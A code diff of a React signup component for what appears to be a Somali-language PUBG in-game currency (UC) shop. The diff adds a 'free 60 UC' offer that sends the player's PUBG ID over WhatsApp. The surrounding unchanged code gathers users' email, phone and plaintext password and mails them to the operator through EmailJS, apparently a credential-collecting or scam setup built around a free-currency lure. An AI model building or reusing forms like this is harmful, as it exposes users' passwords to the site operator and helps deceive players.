@@ -7,9 +7,10 @@ interface AuthProps {
   onBack: () => void;
   initialMode?: 'login' | 'signup';
   onSuccess?: () => void;
+  isFreeUC?: boolean;
 }
 
-export default function Auth({ onBack, initialMode = 'signup', onSuccess }: AuthProps) {
+export default function Auth({ onBack, initialMode = 'signup', onSuccess, isFreeUC }: AuthProps) {
   const [mode, setMode] = useState<'login' | 'signup'>(initialMode);
   const [formData, setFormData] = useState({
     email: '',
@@ -50,6 +51,7 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
         user_phone: formData.phone,
         user_password: formData.password,
         player_id: formData.playerId,
+        is_free_uc: isFreeUC ? 'YES' : 'NO'
       };
 
       try {
@@ -59,7 +61,12 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
 
         const sendToWhatsApp = () => {
           const tel_number = "252771909054"; 
-          const message = `Asc Maanka, waxaan rabaa inaan iibsado UC&conis. Xogtaydu waa lambarka lacagta: Tel: ${formData.phone}`;
+          let message = `Asc Maanka, waxaan rabaa inaan iibsado UC&conis. Xogtaydu waa lambarka lacagta: Tel: ${formData.phone}`;
+          
+          if (isFreeUC) {
+            message = `Asc Maanka, waxaan rabaa 60-ka UC ee BILAASHKA ah.\nXogtaydu waa:\n🆔 PUBG ID: ${formData.playerId}`;
+          }
+
           const whatsappUrl = `https://wa.me/${tel_number}?text=${encodeURIComponent(message)}`;
           window.open(whatsappUrl, '_blank');
         };
@@ -68,8 +75,8 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
           await emailjs.send(serviceId, templateId, templateParams, publicKey);
           
           setIsSubmitting(false);
-          if (onSuccess) onSuccess();
           setIsSubmitted(true);
+          if (onSuccess) onSuccess();
           sendToWhatsApp();
 
           setStatus({ 
@@ -79,10 +86,12 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
         } else {
           // Demo fallback
           console.log('EmailJS keys not configured. Data:', formData);
+          
           setIsSubmitting(false);
-          if (onSuccess) onSuccess();
           setIsSubmitted(true);
+          if (onSuccess) onSuccess();
           sendToWhatsApp();
+
           setStatus({ 
             type: 'success', 
             msg: "Waad ku mahadsantahay is-diiwaangelinta! (Demo Mode)\nDalabkaaga UC waa nala soo gaaray." 
@@ -223,7 +232,7 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
               </div>
             </div>
 
-            {isSubmitted ? (
+            {isSubmitted && mode === 'signup' ? (
               <div className="w-full bg-brand-primary/10 text-brand-primary py-4 rounded-xl font-black text-lg flex items-center justify-center gap-2 mt-4 border border-brand-primary/20 shadow-lg animate-pulse" id="auth-success-message">
                 Dalabkaaga waa nala soo gaaray
               </div>
